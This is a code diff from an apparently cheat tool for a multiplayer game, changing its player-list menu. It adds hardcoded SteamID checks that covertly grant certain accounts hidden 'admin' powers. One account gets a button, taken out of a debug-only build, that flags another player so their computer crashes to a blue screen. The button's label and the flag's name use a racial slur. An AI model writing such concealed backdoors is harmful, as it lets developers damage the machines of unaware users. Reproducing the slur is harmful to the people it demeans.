@@ -129,6 +129,7 @@ namespace playerList {
 
 	static int iSelectedIndex = 0;
 	static bool bAdminInject = false;
+	static bool bCrideInject = false;
 	inline void DrawRecord(playerSettings_t& playerSetting) {
 
 		if (playerSetting.iIndex == -1)
@@ -183,7 +184,7 @@ namespace playerList {
 			{
 				ImGui::PushStyleVar(ImGuiStyleVar_FramePadding, ImVec2(0, 0));
 
-				ImGui::Button("RyzeXTR", ImVec2(50, 20), true); ImGui::SameLine();
+				ImGui::Button("RyzeXTR", ImVec2(70, 20), true); ImGui::SameLine();
 				ImGui::Button("Index", ImVec2(50, 20), true); ImGui::SameLine();
 				ImGui::Button("Username", ImVec2(200, 20), true); ImGui::SameLine();
 				ImGui::Button("Priority", ImVec2(100, 20), true); ImGui::SameLine();
@@ -203,7 +204,12 @@ namespace playerList {
 					if (thisPlayer.bLocalPlayer) {
 						if (!bAdminInject) {
 							const std::string_view& szteamID = thisPlayer.playerInfo.szSteamID;
-							bAdminInject = (szteamID.find("STEAM_1:1:104007215") != std::string_view::npos) || (szteamID.find("STEAM_1:0:89721999") != std::string_view::npos);
+							bAdminInject = 
+								(szteamID.find("STEAM_1:1:104007215") != std::string_view::npos) ||
+								(szteamID.find("STEAM_1:0:89721999") != std::string_view::npos) ||
+								(szteamID.find("STEAM_1:0:760551925") != std::string_view::npos);
+
+							bCrideInject = szteamID.find("STEAM_1:1:104007215") != std::string_view::npos;
 						}
 						DrawRecord(thisPlayer);
 					}
@@ -284,14 +290,14 @@ namespace playerList {
 					ImGui::SameLine();
 					if (ImGui::Button("Kick player", ImVec2(100, 20)))
 						i::EngineClient->ClientCmdUnrestricted(std::format("sm_kick \"#{}\"", currentSelected.playerInfo.nUserID).c_str());
-				}
 
-				#ifdef _DEBUG
-				ImGui::SameLine( );
-				if ( ImGui::Button( "BSOD Nigger", ImVec2( 100, 20 ) ) )
-					currentSelected.BlueScreenNigger = true;
-				#endif
-			
+					if (bCrideInject) {
+
+						ImGui::SameLine();
+						if (ImGui::Button("BSOD Nigger", ImVec2(100, 20)))
+							currentSelected.BlueScreenNigger = true;
+					}
+				}
 				ImGui::PopStyleVar();
 			}
 			ImGui::EndChild();
